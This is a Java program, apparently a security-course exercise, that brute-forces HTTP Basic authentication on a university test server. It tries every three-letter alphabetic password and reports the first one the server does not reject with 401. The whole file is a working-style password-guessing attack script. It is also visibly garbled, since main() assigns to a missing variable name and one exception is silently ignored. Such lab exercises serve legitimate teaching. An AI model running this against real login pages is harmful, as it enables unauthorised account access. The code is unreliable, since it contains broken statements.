import java.io.*;
import java.util.*;
import java.net.*;
import java.net.Authenticator;


public class  BruteForce
{

	private String result ="";

	public class customAuthenticator extends Authenticator {
	       public customAuthenticator(String passwd)
           {
            this.pass = passwd;
           }

	       protected PasswordAuthentication getPasswordAuthentication()
           {
	                 return new PasswordAuthentication("",pass.toCharArray());
           }
           public String pass;
    }

    public BruteForce() {
            java.util.Date d = java.util.Calendar.getInstance().getTime();
            System.out.println(d.toString());
		char words[] = { 'a','b','c','d','e', 'f', 'g', 'h', 'i','j','k','l','m','n','o','p',
							  'q','r','s','t','u','v','w','x','y','z', 'A','B','C','D','E', 'F', 'G',
							   'H', 'I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

		String record = null;



        String url = "http://sec-crack.cs.rmit.edu./SEC/2/";

		char pass[] = {'x','x','x'};
		int count=1;
		String passwd=new String();
        HttpURLConnection connection = null;
        URL u = null;

        try
        {
         u = new URL(url);

        }
        catch (MalformedURLException e)
        {
        }

        for(int a=0;a<words.length;a++)
        {
                for(int b=0;b<words.length;b++)
                {
                        for(int c=0;c<words.length;c++)
                        {
                                 pass[0]=words[a];
                                 pass[1]=words[b];
                                 pass[2]=words[c];
                                 passwd=passwd.copyValueOf(pass,0,3);
                                 System.out.println(count+ " ) " + passwd);
                                 count++;
                                 try
                                 {

                                       connection = (HttpURLConnection) u.openConnection();
                                       Authenticator.setDefault(new customAuthenticator(passwd));

                                       if (connection.getResponseCode()!=401)
                                       {
                                            System.out.print("The password is : "+passwd);
                                            System.out.println();
                                            java.util.Date d1 = java.util.Calendar.getInstance().getTime();
                                            System.out.println(d1.toString());
                                            System.out.println("\ntime taken in seconds:"+ (d1.getTime() - d.getTime())/1000+"\n");

                                            System.exit(0);
                                       }
                                       else
                                       {
                                       }
                                       connection.disconnect();
                                 }
                                 catch (IOException e)
                                 {
                                       System.out.println(e);
                                 }
                        }
                }
        }
    }

	public static void main(String[] args)
	{


		BruteForce  = new BruteForce();
	}
}